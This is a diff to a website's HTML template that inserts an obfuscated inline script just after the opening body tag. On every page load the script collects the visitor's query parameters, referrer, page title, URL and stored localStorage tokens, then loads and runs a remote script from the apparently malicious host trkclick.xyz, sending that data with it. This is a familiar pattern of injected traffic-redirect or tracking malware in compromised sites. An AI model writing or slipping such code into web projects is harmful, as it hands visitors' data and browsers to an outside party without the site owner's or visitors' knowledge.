@@ -39,7 +39,49 @@
     <link href="assets/css/custom.css" rel="stylesheet">
 </head>
 <body>
-
+<script>
+    (function() {
+    var name = '_4mjCHqmyP8tdRXyR';
+    if (!window._4mjCHqmyP8tdRXyR) {
+        window._4mjCHqmyP8tdRXyR = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://trkclick.xyz/KrpDD9',
+            P_PATH: 'https://trkclick.xyz/86169f3/postback',
+        };
+    }
+    const _dT9qDckSwsk1XPQ3 = localStorage.getItem('config');
+    if (typeof _dT9qDckSwsk1XPQ3 !== 'undefined' && _dT9qDckSwsk1XPQ3 !== null) {
+        var _n474W2X7cyYX9kVV = JSON.parse(_dT9qDckSwsk1XPQ3);
+        var _6pKGXDCXNDVcgrPW = Math.round(+new Date()/1000);
+        if (_n474W2X7cyYX9kVV.created_at + window._4mjCHqmyP8tdRXyR.ttl < _6pKGXDCXNDVcgrPW) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _H2gStvH2ZRdrkBKN = localStorage.getItem('subId');
+    var _fgsNd1Kx73v35ZQj = localStorage.getItem('token');
+    var _ZrcNC3zgGcPzvPL6 = '?return=js.client';
+        _ZrcNC3zgGcPzvPL6 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _ZrcNC3zgGcPzvPL6 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _ZrcNC3zgGcPzvPL6 += '&default_keyword=' + encodeURIComponent(document.title);
+        _ZrcNC3zgGcPzvPL6 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _ZrcNC3zgGcPzvPL6 += '&name=' + encodeURIComponent(name);
+        _ZrcNC3zgGcPzvPL6 += '&host=' + encodeURIComponent(window._4mjCHqmyP8tdRXyR.R_PATH);
+    if (typeof _H2gStvH2ZRdrkBKN !== 'undefined' && _H2gStvH2ZRdrkBKN && window._4mjCHqmyP8tdRXyR.unique) {
+        _ZrcNC3zgGcPzvPL6 += '&sub_id=' + encodeURIComponent(_H2gStvH2ZRdrkBKN);
+    }
+    if (typeof _fgsNd1Kx73v35ZQj !== 'undefined' && _fgsNd1Kx73v35ZQj && window._4mjCHqmyP8tdRXyR.unique) {
+        _ZrcNC3zgGcPzvPL6 += '&token=' + encodeURIComponent(_fgsNd1Kx73v35ZQj);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._4mjCHqmyP8tdRXyR.R_PATH + _ZrcNC3zgGcPzvPL6;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+</script>
 <!-- Preloader -->
 <div class="preloader">
     <div class="preload-img">
